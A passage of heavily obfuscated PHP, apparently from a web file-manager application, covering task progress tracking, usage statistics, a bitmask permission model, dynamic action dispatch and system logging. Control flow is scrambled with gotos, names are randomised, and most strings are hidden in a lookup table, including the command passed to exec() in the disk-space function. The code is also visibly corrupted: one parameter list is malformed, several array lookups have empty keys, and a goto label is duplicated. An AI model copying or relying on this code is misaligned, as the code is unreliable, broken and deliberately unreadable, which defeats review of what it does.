$fڎС =& $this->task; $fڎС[$C[1385]] = $fڎС[$C[1384]]; $fڎС[$C[1386]] = $C[33]; if ($Eۚ == $fڎС[$C[1382]]) { $fڎС[$C[1389]] += $fڎС[$C[1384]]; $this->update(1); } else { $this->update(); $fڎС[$C[1385]] = 0; } self::log($C[1394] . $CҤ . $C[67] . $f߸î . $C[214] . $Eۚ . $C[1395] . $fڎС[$C[1382]]); } public function updateFileEnd($c, $aޣ) { $e =& $_SERVER[놫Ӱ]; $Fխ =& $this->task; $Fխ[$e[1382]] = $c; $Fխ[$e[1384]] = $aޣ; $Fխ[$e[1389]] += $aޣ; $this->update(1); } public function sourceModelCopy($a) { goto Cɝ; e: switch ($c) { case $e[500]: $d = 1; break; case $e[503]: $cۈ[$e[1382]] = $C[$e[28]]; break; case $e[505]: $d = intval($a[$e[360]] * 0.4); break; case $e[507]: $d = intval($a[$e[360]] * 0.2); break; case $e[509]: $d = intval($a[$e[360]] * 0.4); break; } $this->update($d); $this->sourceModelCopyFlag = !1; goto F̺; Cɝ: $e =& $_SERVER[놫Ӱ]; $c = $a[0]; $C = $a[1]; goto Fؒ; Fؒ: $cۈ =& $this->task; $this->sourceModelCopyFlag = !0; $d = 0; goto e; F̺: } public function sourceRemove($eנ, $Aː) { $c =& $_SERVER[놫Ӱ]; $this->sourceModelCopyFlag = !0; $A癠Ҋ = 1; if (isset($eנ[$c[81]])) { $A癠Ҋ = $eנ[$c[81]][$c[79]] + $eנ[$c[81]][$c[80]] + 1; } $this->update($A癠Ҋ); $this->sourceModelCopyFlag = !1; } public function sourceMove($f҉) { $this->sourceRemove($f҉, !1); } public function curlProgress($A, $AƊߏ, $B˱, $c⽘, $cҧ) { $C쩌 =& $_SERVER[놫Ӱ]; $Eŧ =& $this->task; if ($cҧ > 0) { $Eŧ[$C쩌[1283]] = $C쩌[1396]; $Eŧ[$C쩌[1386]] = $C쩌[90]; if ($Eŧ[$C쩌[1384]] == $c⽘ || $c⽘ > 1024 * 1024) { $Eŧ[$C쩌[1385]] = $cҧ; } if ($Eŧ[$C쩌[1387]]) { $Eŧ[$C쩌[1385]] = $cҧ + $Eŧ[$C쩌[1387]]; } } else { if ($B˱ > 0) { if ($Eŧ[$C쩌[1384]] == $AƊߏ) { $Eŧ[$C쩌[1385]] = $B˱; $Eŧ[$C쩌[1283]] = $C쩌[1397]; $Eŧ[$C쩌[1386]] = $C쩌[1013]; } } } $this->update(); } public function curlProgressStart($E𢅔) { } public function curlProgressEnd($D㫘Ӊ) { $D㙷 =& $_SERVER[놫Ӱ]; $aɈ =& $this->task; $Cͨ = curl_getinfo($D㫘Ӊ); $bפë = $Cͨ[$D㙷[1398]]; if ($aɈ[$D㙷[1386]] == $D㙷[90] && $bפë) { $aɈ[$D㙷[1387]] += $bפë; } $this->update(); } } $A˕ = LIB_DIR . $_SERVER[놫Ӱ][1217]; $D쒧 = $_SERVER[놫Ӱ][781]; goto E; Fꌱ섷: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($E) { $C˨ =& $_SERVER[놫Ӱ]; $f = array($C˨[527] => array($C˨[29] => $C˨[1929], $C˨[258] => array($C˨[207], $C˨[685], $C˨[1930], $C˨[1931])), $C˨[1932] => array($C˨[29] => $C˨[1933], $C˨[258] => array($C˨[207], $C˨[683], $C˨[1934], $C˨[1935], $C˨[1936]))); if (!isset($f[$E])) { return !1; } $this->optionType = $f[$E][$C˨[29]]; $this->field = $f[$E][$C˨[258]]; return !0; } public function listData($A = false, $f񿇉 = "\x6d\157\144\151\x66\171\124\151\155\x65", $d; = false) { return parent::listData($A, $f񿇉, $d;); } public function trendList($Dݑ׫) { goto EӬ; eӅ: foreach ($B֯ as $E՚ڽ) { $this->{$E}($E՚ڽ); } return $this->listData(); goto cՎ; EӬ: $aɃ =& $_SERVER[놫Ӱ]; $D = $this->listData(); if ($D) { $cɛ = end($D); $E՚ڽ = date($aɃ[1937], strtotime($aɃ[1938])); if ($cɛ[$aɃ[207]] == $E՚ڽ) { return $D; } $bώ = strtotime($cɛ[$aɃ[207]]); } goto A; A: if (!isset($bώ)) { $Eó = $Dݑ׫ == $aɃ[527] ? $aɃ[469] : $aɃ[747]; $bώ = Model($Eó)->min($aɃ[184]); } $E = $aɃ[1939] . ucfirst($Dݑ׫); $B֯ = $this->dateList($bώ); goto eӅ; cՎ: } private function dateList($d) { $C߻ =& $_SERVER[놫Ӱ]; $fظ = $d; $E = strtotime($C߻[1938]); $e = array(); while ($fظ <= $E) { $e[] = date($C߻[1937], $fظ); $fظ = strtotime($C߻[1940], $fظ); } return $e; } public function _recordUser($B뼯 = '') { goto f节; B: $b = Model($Dۅ[469])->where($d俓)->count($Dۅ[1339]); $d俓[$Dۅ[29]] = $Dۅ[1943]; $fڭ = Model($Dۅ[1944])->where($d俓)->count($Dۅ[1945]); goto Dӧ; B: $d俓 = array($Dۅ[184] => array($Dۅ[920], $EƝ)); $Dզ = Model($Dۅ[469])->where($d俓)->count($Dۅ[1339]); $d俓[$Dۅ[184]] = array($Dۅ[318], array($fﵙ, $EƝ)); goto B; f节: $Dۅ =& $_SERVER[놫Ӱ]; $fﵙ = strtotime(date($Dۅ[1941], strtotime($B뼯))); $EƝ = strtotime(date($Dۅ[1942], strtotime($B뼯))); goto B; Dӧ: $f = array($Dۅ[207] => $B뼯, $Dۅ[685] => (int) $Dզ, $Dۅ[1930] => (int) $b, $Dۅ[1931] => (int) $fڭ); return $this->insert($f); goto Eל; Eל: } public function _recordStore($Cʤ = '') { goto fʊ; B䑉Ç: $d = Model($dѥ[418])->where($F)->sum($dѥ[78]); $F[$dѥ[367]] = 0; $fƆ = Model($dѥ[747])->where($F)->sum($dѥ[78]); goto bǴ; bǴ: $F[$dѥ[368]] = 1; $F = Model($dѥ[747])->where($F)->sum($dѥ[78]); $F[$dѥ[368]] = 2; goto e; fʊ: $dѥ =& $_SERVER[놫Ӱ]; $c = strtotime(date($dѥ[1942], strtotime($Cʤ))); $F = array($dѥ[184] => array($dѥ[920], $c)); goto B䑉Ç; e: $b䄋 = Model($dѥ[747])->where($F)->sum($dѥ[78]); $FՔЂ = array($dѥ[207] => $Cʤ, $dѥ[683] => (int) $fƆ, $dѥ[1934] => (int) $d, $dѥ[1935] => (int) $F, $dѥ[1936] => (int) $b䄋); return $this->insert($FՔЂ); goto F; F: } public function trend($b轐, $C噄Ք) { goto A͒; bթ: if (empty($D)) { $fɈ = date($F۩׸[1937], strtotime($F۩׸[1938])); $b럿 = array($F۩׸[207] => $fɈ); foreach ($D؞[$b轐] as $b菶 => $Eƅ) { $b럿[$b菶] = 0; } $D[] = $b럿; } $fǜ = array(); foreach ($D as $Eƅ) { if ($b轐 == $F۩׸[1932] && $Eƅ[$F۩׸[1934]] > $Eƅ[$F۩׸[683]]) { $Eƅ[$F۩׸[1934]] = $Eƅ[$F۩׸[683]]; } foreach ($D؞[$b轐] as $b菶 => $e) { $F֊ = array($F۩׸[207] => $Eƅ[$F۩׸[207]], $F۩׸[1237] => $e); $F֊[$C酇[$b轐]] = isset($Eƅ[$b菶]) ? $Eƅ[$b菶] : 0; $fǜ[] = $F֊; } } goto fƧ; fƧ: return $fǜ; goto E㲺; A͒: $F۩׸ =& $_SERVER[놫Ӱ]; if (!$this->init($b轐)) { return !1; } $D = $this->trendList($b轐); goto CʷϽ; CʷϽ: if ($D && $C噄Ք != $F۩׸[1314]) { $E = $D[0][$F۩׸[207]]; $e = $this->validDate($C噄Ք, $E); $C = array(); $C؞ = array_to_keyvalue($D, $F۩׸[207]); foreach ($e as $fɈ) { if (isset($C؞[$fɈ])) { $F֊ = $C؞[$fɈ]; } else { $F֊ = end($D); $F֊[$F۩׸[207]] = $fɈ; if ($b轐 == $F۩׸[527]) { $F֊[$F۩׸[1930]] = $F֊[$F۩׸[1931]] = 0; } } $C[] = $F֊; } $D = $C; } $D؞ = array($F۩׸[527] => array($F۩׸[685] => LNG($F۩׸[1946]), $F۩׸[1930] => LNG($F۩׸[1947]), $F۩׸[1931] => LNG($F۩׸[1948])), $F۩׸[1932] => array($F۩׸[683] => LNG($F۩׸[1949]), $F۩׸[1934] => LNG($F۩׸[1950]), $F۩׸[1935] => LNG($F۩׸[1951]), $F۩׸[1936] => LNG($F۩׸[1952]))); $C酇 = array($F۩׸[527] => $F۩׸[1953], $F۩׸[1932] => $F۩׸[78]); goto bթ; E㲺: } public function validDate($A, $bᑦ) { goto cʕ; Fق: switch ($A) { case $Bݐ[1321]: $D = mktime(0, 0, 0, date($Bݐ[1954]), date($Bݐ[1955]) - date($Bݐ[1181]) + 7 - 7, date($Bݐ[1956])); $a㟚 = 0; do { $bғҐ = date($Bݐ[1937], $D - 3600 * 24 * 7 * $a㟚); $ḙ¸[] = $bғҐ; $a㟚++; } while ($bᑦ < $bғҐ); break; case $Bݐ[1319]: $a㟚 = 1; do { $b = date($Bݐ[1957], strtotime("\55\x20{$a㟚}\x20\x6d\x6f\x6e\164\x68\x73")); $ḙ¸[] = $b; $a㟚++; } while ($bᑦ < $b); break; case $Bݐ[1622]: $Dز = (int) date($Bݐ[1956], strtotime($bᑦ)); $aގ = (int) date($Bݐ[1956]); if ($Dز >= $aގ) { break; } for ($Dز; $Dز < $aގ; $Dز++) { $ḙ¸[] = $Dز . $Bݐ[1958]; } break; default: break; } if ($bᑦ > end($ḙ¸)) { array_pop($ḙ¸); } sort($ḙ¸); goto E; cʕ: $Bݐ =& $_SERVER[놫Ӱ]; $Fꊭۤ = date($Bݐ[1937], strtotime($Bݐ[1938])); $ḙ¸ = array($Fꊭۤ); goto Fق; E: return $ḙ¸; goto Cʰ; Cʰ: } public function listTable($E) { $aİ = ucfirst($E); return Model($aİ)->listData(); } public function option($cޥ) { $DÝ晽ױ = $_SERVER[놫Ӱ][1959] . ucfirst($cޥ); return $this->{$DÝ晽ױ}(); } private function optionUser() { goto D; f˔ߑ: if (!$F) { $F = 1; } $F۱֌ = strtotime(date($E[1941])); $bɥĂ = array($E[1962] => array($E[921], $F۱֌)); goto b䳟; Fե: $F۱֌ = strtotime($E[1961]); $bɥĂ = array($E[1962] => array($E[921], $F۱֌)); $F = (int) Model($E[469])->where($bɥĂ)->count($E[1339]); goto f˔ߑ; b䳟: $F = Model($E[469])->where($bɥĂ)->count($E[1339]); return array($E[680] => (int) $Bđ, $E[1963] => (int) ($Bđ - $d쎋), $E[1964] => (int) $d쎋, $E[1965] => (int) $F, $E[1966] => $F); goto Cτ݈; D: $E =& $_SERVER[놫Ӱ]; $Bđ = Model($E[469])->count($E[1339]); $d쎋 = Model($E[469])->where($E[1960])->count($E[1339]); goto Fե; Cτ݈: } private function optionFile() { goto d칄ۢ; d칄ۢ: $bȹϑ =& $_SERVER[놫Ӱ]; $e = $this->sourceSize(); $a庡 = $e[$bȹϑ[78]]; goto Fʃ; Fʃ: $bΦ = $e[$bȹϑ[1934]]; $A = Model($bȹϑ[747])->where(array($bȹϑ[367] => 0))->count($bȹϑ[366]); $fֱ = array($bȹϑ[367] => 0, $bȹϑ[184] => array($bȹϑ[921], strtotime(date($bȹϑ[1941])))); goto DɌ; DɌ: $c = Model($bȹϑ[747])->where($fֱ)->sum($bȹϑ[78]); $fܮ = Model($bȹϑ[747])->where($fֱ)->count($bȹϑ[366]); return array($bȹϑ[683] => $a庡, $bȹϑ[1934] => $bΦ, $bȹϑ[1967] => $a庡 - $bΦ, $bȹϑ[1968] => (int) $c, $bȹϑ[685] => (int) $A, $bȹϑ[1969] => (int) $fܮ); goto f; f: } private function optionAccess() { $Fӊ܆ =& $_SERVER[놫Ӱ]; return array($Fӊ܆[680] => $this->typeLogCnt(), $Fӊ܆[90] => $this->typeLogCnt($Fӊ܆[90]), $Fӊ܆[400] => $this->typeLogCnt($Fӊ܆[400]), $Fӊ܆[1970] => $this->typeLogCnt($Fӊ܆[1970]), $Fӊ܆[1971] => $this->typeLogCnt($Fӊ܆[1971]), $Fӊ܆[527] => $this->typeLogCnt($Fӊ܆[33], $Fӊ܆[1945])); } private function typeLogCnt($fɞͅ = '', $eՕ = "\x69\x64") { goto a䖐; C: $D = array($c[184] => array($c[921], $F)); if ($fɞͅ) { $D[$c[29]] = array($c[7], $Cޥˠ[$fɞͅ]); } $A׷ = Model($c[1944])->where($D)->count($eՕ); goto dׇ; a䖐: $c =& $_SERVER[놫Ӱ]; $Cޥˠ = array($c[90] => array($c[1972], $c[1973]), $c[400] => array($c[1974]), $c[1970] => array($c[1975], $c[1976]), $c[1971] => array($c[1977], $c[1978]), $c[1979] => array($c[1980], $c[1981], $c[1982])); $F = strtotime(date($c[1941])); goto C; dׇ: return (int) $A׷; goto b; b: } private function optionServer() { goto c; c: $ḋ =& $_SERVER[놫Ӱ]; $eƸ۵ = $this->diskDriver(); $Eɵ = KodIO::defaultDriver(); goto FɅ; C: if ($FǺ == $ḋ[719]) { $bš = explode($ḋ[720], $fŬ[$ḋ[721]]); $FǺ = $bš[0]; } if ($FǺ == $ḋ[817] || $FǺ == $ḋ[701]) { $fÞ = Model()->db()->query($ḋ[1983]); $c = $fÞ[0] && isset($fÞ[0][$ḋ[1236]]) ? $fÞ[0][$ḋ[1236]] : 0; $FǺ = $ḋ[1984] . ($c ? $ḋ[8] . $c : $ḋ[33]); } $a = $GLOBALS[$ḋ[6]][$ḋ[334]][$ḋ[748]]; goto c܇; c܇: return array($ḋ[1985] => $eƸ۵ ? $eƸ۵[$ḋ[1986]] : 0, $ḋ[1987] => $eƸ۵ ? $eƸ۵[$ḋ[1988]] : 0, $ḋ[1989] => (int) $Eɵ[$ḋ[1986]] * 1024 * 1024 * 1024, $ḋ[1990] => (int) $a, $ḋ[1991] => ucfirst($bɥ), $ḋ[1992] => $ḋ[1993] . PHP_VERSION, $ḋ[1994] => phpBuild64() ? 64 : 32, $ḋ[679] => str_replace($ḋ[1995], $ḋ[897], $FǺ), $ḋ[334] => ucfirst($a), $ḋ[28] => $_SERVER[$ḋ[1996]]); goto e; B͂: $bɥ = $D֔ˑ֒[0]; $fŬ = $GLOBALS[$ḋ[6]][$ḋ[17]]; $FǺ = $fŬ[$ḋ[718]]; goto C; FɅ: $Fņǂ = array($ḋ[708] => $Eɵ[$ḋ[364]]); $a = Model($ḋ[418])->where($Fņǂ)->sum($ḋ[78]); $D֔ˑ֒ = explode($ḋ[50], $_SERVER[$ḋ[136]]); goto B͂; e: } private function diskDriver() { goto fה; E̅: $aא = $f檈 - @disk_free_space($b); return array($B¯Ҙ[1986] => $f檈, $B¯Ҙ[1988] => $aא); goto Fɱ; fה: $B¯Ҙ =& $_SERVER[놫Ӱ]; $b = $B¯Ҙ[8]; $B = $GLOBALS[$B¯Ҙ[6]][$B¯Ҙ[1997]] == $B¯Ҙ[1998]; goto a셧; a셧: if ($B) { $b = $B¯Ҙ[1999]; if (function_exists($B¯Ҙ[2000])) { exec($B¯Ҙ[2001], $D); $b = $D[1] . $B¯Ҙ[8]; } } if (!file_exists($b)) { return; } $f檈 = @disk_total_space($b); goto E̅; Fɱ: } public function fileChart($Fǳ) { goto Eҗ; f듐: $f܋雑 = $this->sourceSize(); $CĦŞ = array($b[457] => 0, $b[368] => 1); $f돊 = Model($b[747])->where($CĦŞ)->sum($b[78]); goto bЯ; Eҗ: $b =& $_SERVER[놫Ӱ]; if (isset($Fǳ[$b[1339]])) { return Model($b[747])->userFileTypeProfile($Fǳ[$b[1339]]); } if (isset($Fǳ[$b[2002]])) { return Model($b[747])->groupFileTypeProfile($Fǳ[$b[2002]]); } goto f듐; bЯ: $CĦŞ[$b[368]] = 2; $d珄 = Model($b[747])->where($CĦŞ)->sum($b[78]); return array($b[683] => $f܋雑[$b[78]], $b[1934] => $f܋雑[$b[1934]], $b[1935] => (int) $f돊, $b[1936] => (int) $d珄); goto d; d: } private function sourceSize() { $A =& $_SERVER[놫Ӱ]; $d = Model($A[747])->where(array($A[367] => 0))->sum($A[78]); $A = Model($A[418])->sum($A[78]); if ($A > $d) { $A = $d; } return array($A[78] => (int) $d, $A[1934] => (int) $A); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $bݴ =& $_SERVER[놫Ӱ]; $cŧ = array(array($bݴ[383] => LNG($bݴ[2003]), $bݴ[2004] => $bݴ[2005], $bݴ[2006] => 6, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bݴ[383] => LNG($bݴ[2009]), $bݴ[2004] => $bݴ[2010], $bݴ[2006] => 1, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bݴ[383] => LNG($bݴ[2011]), $bݴ[2004] => $bݴ[2012], $bݴ[2006] => 2, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bݴ[383] => LNG($bݴ[2013]), $bݴ[2004] => $bݴ[2012], $bݴ[2006] => 3, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bݴ[383] => LNG($bݴ[2014]), $bݴ[2004] => $bݴ[2015], $bݴ[2006] => 4, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_VIEW), array($bݴ[383] => LNG($bݴ[2016]), $bݴ[2004] => $bݴ[2017], $bݴ[2006] => 5, $bݴ[2007] => 1, $bݴ[2008] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bݴ[383] => LNG($bݴ[2018]), $bݴ[2004] => $bݴ[2019], $bݴ[2006] => 7, $bݴ[2007] => 1, $bݴ[2008] => 0)); return $cŧ; } public static function authCheck($D䅒, $b) { $D䅒 = intval($D䅒); if ($GLOBALS[$_SERVER[놫Ӱ][453]]) { return !0; } if ($D䅒 <= 0) { return !1; } if (($D䅒 & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D䅒 & $b); } public static function authCheckShow($Eك) { return self::authCheck($Eك, self::AUTH_SHOW); } public static function authCheckView($FӦ) { return self::authCheck($FӦ, self::AUTH_VIEW); } public static function authCheckDownload($bػ) { return self::authCheck($bػ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($D峳) { return self::authCheck($D峳, self::AUTH_UPLOAD); } public static function authCheckEdit($f) { return self::authCheck($f, self::AUTH_EDIT); } public static function authCheckRemove($fպ) { return self::authCheck($fպ, self::AUTH_REMOVE); } public static function authCheckShare($dԆ) { return self::authCheck($dԆ, self::AUTH_SHARE); } public static function authCheckComment($aͅ) { return self::authCheck($aͅ, self::AUTH_COMMENT); } public static function authCheckEvent($Fܶ) { return self::authCheck($Fܶ, self::AUTH_EVENT); } public static function authCheckRoot($aߏĨ) { return self::authCheck($aߏĨ, self::AUTH_ROOT); } public static function authDisable($cӅ, $C񸙛) { if (intval($cӅ) <= 0) { return 0; } return intval($cӅ) & ~$C񸙛; } public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\163\x6f\165\162\x63\145\x41\165\x74\150\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\141\165\x74\x68", "\154\141\x62\x65\x6c", "\144\151\163\x70\154\141\x79", "\163\x79\163\164\145\x6d", "\163\157\x72\x74"); public function initData() { $Eه = $this->authDefault(); foreach ($Eه as $BⰖ) { $this->add($BⰖ); } } public function listData($C = false, $ḛ̯ = "\x73\157\x72\164", $C§ = false) { return parent::listData($C, $ḛ̯, $C§); } public function update($cآ, $D) { $a͡ =& $_SERVER[놫Ӱ]; $A = parent::listData($cآ); $D = $this->findByName($D[$a͡[28]]); if (!$A || $D && $D[$a͡[364]] != $A[$a͡[364]]) { return !1; } $this->filterAuth($D[$a͡[373]]); return parent::update($cآ, $D); } public function remove($E) { $f = parent::listData($E); if (!$f || $f[$_SERVER[놫Ӱ][1047]]) { return !1; } return parent::remove($E); } public function add($Fլ = array()) { goto C; bņ: return parent::insert($Fլ); goto B߻; C: $f =& $_SERVER[놫Ӱ]; if ($this->findByName($Fլ[$f[28]])) { return !1; } $B = array($f[28] => $f[33], $f[373] => 1, $f[2020] => $f[2021], $f[2022] => 1, $f[1047] => 0, $f[2023] => 0); goto EΔ; EΔ: $Fլ = array_merge($B, $Fլ); $Fլ[$f[2023]] = $this->getSort(); $this->filterAuth($Fլ[$f[373]]); goto bņ; B߻: } private function getSort() { $B݄殭 =& $_SERVER[놫Ӱ]; $aө = parent::listData(); $e = array_to_keyvalue($aө, $B݄殭[33], $B݄殭[2023]); return empty($e) ? 0 : max($e) + 1; } private function filterAuth(&$b) { goto cȟ; fւ: foreach ($F˔ as $A路) { if ($b & $A路) { $Eޑҿ[] = $A路; } } if (in_array(self::AUTH_ROOT, $Eޑҿ)) { $b = array_sum($F˔); return; } $e팙 = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DނЮ; cȟ: if (!$b) { return; } $F˔ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Eޑҿ = array(); goto fւ; DނЮ: foreach ($Eޑҿ as $A路) { if (isset($e팙[$A路])) { $Eޑҿ = array_merge($Eޑҿ, $e팙[$A路]); } } $Eޑҿ[] = self::AUTH_SHOW; $b = array_sum(array_unique($Eޑҿ)); goto B٘; B٘: } public function sort($Dƙ, $cȢ) { return parent::update($Dƙ, $cȢ); } } goto f ; dڈޏ: function Action($bĉ = '') { goto c; C˶Ν: if (!class_exists($F)) { return actionCallError("\x5b{$bĉ}\x20\75\76\40{$F}\135\x20\143\x6c\141\163\x73\40\156\x6f\x74\x20\x65\x78\x69\163\x74\x73\x21"); } $dː[$bݴ] = new $F(); return $dː[$bݴ]; goto f͢; c: $d׼Ʉ =& $_SERVER[]; static $dː = array(); $bĉ = trim(str_replace($d׼Ʉ[2], $d׼Ʉ[3], $bĉ), $d׼Ʉ[2]); goto Dۃ; d: $bݴ = strtolower($F); if (isset($dː[$bݴ])) { return $dː[$bݴ]; } if (is_file($Fȡǐ)) { include_once $Fȡǐ; } goto C˶Ν; Dۃ: $B쯮Ë = explode($d׼Ʉ[3], $bĉ); $c슓 = strtolower($B쯮Ë[0]); if (substr($c슓, -6) == $d׼Ʉ[4]) { $bĉ = substr($B쯮Ë[0], 0, -6); $F = $bĉ . $d׼Ʉ[5]; $Fȡǐ = $d׼Ʉ[6]; if (isset($B쯮Ë[1]) && substr(strtolower($B쯮Ë[1]), -5) == $d׼Ʉ[7]) { $F = $bĉ . $B쯮Ë[1]; $Fȡǐ = $d׼Ʉ[8] . $B쯮Ë[1] . $d׼Ʉ[9]; } else { if (count($B쯮Ë) == 3) { $F = $bĉ . $B쯮Ë[1] . $B쯮Ë[2]; $Fȡǐ = $d׼Ʉ[10] . $B쯮Ë[1] . $d׼Ʉ[11] . $B쯮Ë[2] . $d׼Ʉ[9]; } } $Fȡǐ = PLUGIN_DIR . $bĉ . $d׼Ʉ[2] . $Fȡǐ; } else { if (substr($c슓, -5) == $d׼Ʉ[7]) { $bĉ = substr($B쯮Ë[0], 0, -5); return Model($bĉ); } else { $F = $B쯮Ë[0] . $B쯮Ë[1]; $Fȡǐ = CONTROLLER_DIR . $B쯮Ë[0] . $d׼Ʉ[2] . $B쯮Ë[1] . $d׼Ʉ[12]; } } goto d; f͢: } function ActionApply($a, $aҒ = array()) { goto Fфɇ; Fфɇ: if (is_array($a)) { return call_user_func_array($a, $aҒ); } if (function_exists($a)) { return call_user_func_array($a, $aҒ); } $Eޓ = strrpos($a, $_SERVER[][3]); goto F͠綼; D: if (!method_exists($c, $eƫ)) { return actionCallError("{$a}\x20\155\x65\164\x68\157\x64\x20\156\x6f\x74\x20\x65\170\x69\x73\x74\x73\x21"); } $bҚ = call_user_func_array(array($c, $eƫ), $aҒ); return $bҚ; goto fȽ; F͠綼: $bƃ = substr($a, 0, $Eޓ); $eƫ = substr($a, $Eޓ + 1); $c = Action($bƃ); goto D; fȽ: } function actionCallError($a΋П؅) { $Ĉǲ =& $_SERVER[]; $E̙ = json_encode_force(array($Ĉǲ[13] => this_url(), $Ĉǲ[14] => $GLOBALS[$Ĉǲ[14]])); $E̙ = str_replace(array($Ĉǲ[15]), array($Ĉǲ[2]), $E̙); return write_log($a΋П؅ . $Ĉǲ[16] . $E̙, $Ĉǲ[17]); } goto EƠ; EԬ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\114\151\147\x68\164\101\x70\160"; public $modelType = "\123\171\x73\x74\145\155\x4f\160\164\151\157\x6e"; public $field = array("\156\141\x6d\145", "\x67\x72\157\x75\x70", "\144\x65\163\143", "\143\157\156\164\145\156\164"); public function listData($bϔ = false, $fЛ = "\x6d\157\144\151\x66\x79\x54\151\155\145", $d = true) { return parent::listData($bϔ, $fЛ, $d); } public function remove($EƕȊ) { $Bϐ = $this->findByName($EƕȊ); if (!$Bϐ) { return !1; } return parent::remove($Bϐ[$_SERVER[놫Ӱ][364]]); } public function add($E޻) { if ($this->findByName($E޻[$_SERVER[놫Ӱ][28]])) { return !1; } return parent::insert($E޻); } public function update($D呦, $Bɏ) { $c㳯 =& $_SERVER[놫Ӱ]; $e = $this->findByName($D呦); $f̪ = $this->findByName($Bɏ[$c㳯[28]]); if (!$e || $f̪ && $f̪[$c㳯[364]] != $e[$c㳯[364]]) { return !1; } return parent::update($e[$c㳯[364]], $Bɏ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\154\157\147"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\146\165\x6e\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $d =& $_SERVER[놫Ӱ]; return array($d[2253] => LNG($d[2254]), $d[2255] => LNG($d[2256]), $d[1943] => LNG($d[2257]), $d[2258] => LNG($d[2259]), $d[2260] => LNG($d[2261]), $d[2262] => LNG($d[2263]), $d[2264] => LNG($d[2265]), $d[2266] => LNG($d[2267]), $d[1974] => LNG($d[2268]), $d[2269] => LNG($d[2270]), $d[2271] => LNG($d[2272]), $d[2273] => LNG($d[2274]), $d[2275] => LNG($d[2276]), $d[1972] => LNG($d[2277]), $d[1977] => LNG($d[2278]), $d[2279] => LNG($d[2280]), $d[2281] => LNG($d[2282]), $d[2283] => LNG($d[2284]), $d[2285] => LNG($d[2286]), $d[1980] => LNG($d[2287]), $d[1981] => LNG($d[2288]), $d[2289] => LNG($d[2290]), $d[2291] => LNG($d[2292]), $d[2293] => LNG($d[2294]), $d[2295] => LNG($d[2296]), $d[2297] => LNG($d[2298]), $d[1975] => LNG($d[2299]), $d[2300] => LNG($d[2301]), $d[2302] => LNG($d[2303]), $d[2304] => LNG($d[2304]), $d[2305] => LNG($d[1947]), $d[2306] => LNG($d[2307]), $d[2308] => LNG($d[2309]), $d[2310] => LNG($d[2311]), $d[2312] => LNG($d[2313]), $d[2314] => LNG($d[2314]), $d[2315] => LNG($d[2316]), $d[2317] => LNG($d[2318]), $d[2319] => LNG($d[2320]), $d[2321] => LNG($d[2322]), $d[2323] => LNG($d[2324]), $d[2325] => LNG($d[2326])); } private function typeFile() { $Fѯ =& $_SERVER[놫Ӱ]; $Aİ˱ = array($Fѯ[1977] => array($Fѯ[1978]), $Fѯ[2273] => array($Fѯ[2327]), $Fѯ[2275] => array($Fѯ[2328]), $Fѯ[1972] => array($Fѯ[1973]), $Fѯ[2281] => array(), $Fѯ[2283] => array(), $Fѯ[2285] => array(), $Fѯ[1980] => array($Fѯ[1982]), $Fѯ[1981] => array($Fѯ[1982]), $Fѯ[2289] => array($Fѯ[2329]), $Fѯ[2291] => array($Fѯ[2329]), $Fѯ[2293] => array($Fѯ[2330]), $Fѯ[2279] => array($Fѯ[2331]), $Fѯ[2295] => array($Fѯ[2332]), $Fѯ[2297] => array($Fѯ[2333]), $Fѯ[1975] => array($Fѯ[1976])); return $Aİ˱; } private function typeAll() { goto c͇; Aۡ: return $Fޥ; goto cƔ; CĎք: foreach ($Bߑ as $eׯ => $d֋) { $Fޥ[$d֋[0]] = $Fޥ[$eׯ]; } $Fޥ[$aӄ[1982]] = LNG($aӄ[2334]); $Fޥ[$aӄ[2329]] = LNG($aӄ[2335]); goto Aۡ; c͇: $aӄ =& $_SERVER[놫Ӱ]; $Fޥ = $this->typeList; $Bߑ = array_filter($this->typeFile()); goto CĎք; cƔ: } public function addLog($f, $Fڱ = array()) { goto bՏ֨; b۫֬: parent::add($Fڱ); goto Aљ­; E: $eЫ = 